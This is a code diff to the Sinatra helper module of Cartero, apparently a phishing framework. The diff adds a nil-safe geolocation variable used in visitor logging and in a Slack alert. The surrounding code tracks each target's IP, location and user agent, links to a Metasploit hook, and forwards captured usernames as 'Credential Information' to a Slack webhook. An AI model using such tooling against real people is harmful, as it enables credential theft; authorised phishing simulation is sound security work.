@@ -42,18 +42,19 @@ module SinatraHelpers
   end
 
   def process_info
+    geo_loc = "#{request.location.city}/#{request.location.country}" if request.location != nil
     @data = {}
     if (params[:key] && params[:key] != "" && params[:key] != nil ) || cookies["session_info"] != nil
       begin
         @data = JSON.parse(::Cartero::CryptoBox.decrypt(params[:key] || cookies["session_info"]),{:symbolize_names => true})
         cookies["session_info"] ||= params[:key]
       rescue RbNaCl::CryptoError
-        log "#{Time.now} - ERROR Entity Could not be decrypt it. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
-        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - ERROR Entity Could not be decrypt it. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
         return
       rescue ArgumentError
-        log "#{Time.now} - ERROR Entity Could not be parsed correctly. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
-        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - ERROR Entity Could not be parsed correctly. - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
+        log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
         return
       end
       # Save or Create a new person hitting the URL path.
@@ -62,9 +63,9 @@ module SinatraHelpers
       # if listener was started with metasploit RPC option
       process_metasploit
 
-      log "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+      log "#{Time.now} - PERSON #{person.email} - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
     else
-      log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{request.location.city}/#{request.location.country} - USER_AGENT #{request.user_agent}"
+      log "#{Time.now} - PERSON noname@cartero.com - IP #{request.ip} PORT #{request.port} PATH #{request.path_info} - GEO #{geo_loc} - USER_AGENT #{request.user_agent}"
     end
   end
 
@@ -94,11 +95,12 @@ module SinatraHelpers
       @slack ||= Slack::Notifier.new ::Cartero::GlobalConfig["slack"]["webhook"],
         username: ::Cartero::GlobalConfig["slack"]["username"],
         channel: ::Cartero::GlobalConfig["slack"]["channel"]
-  		data = {
+      geo_loc = "#{request.location.city}/#{request.location.country}" if request.location != nil
+      data = {
         title: "Cartero Credential Information",
         fallback: "*IP:* #{request.ip}\n" +
         "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
-        "*GEOLOCATION* #{request.location.city}/#{request.location.country}\n" +
+        "*GEOLOCATION* #{geo_loc}\n" +
         "*USER-AGENT* #{request.user_agent}",
         text: "*IP:* #{request.ip}\n" +
         "*USERNAME* #{params[:username] || params[:email] || params[:user] || params[params.keys.select {|x| x =~ /email|user|uname/i }[0]]}\n" +
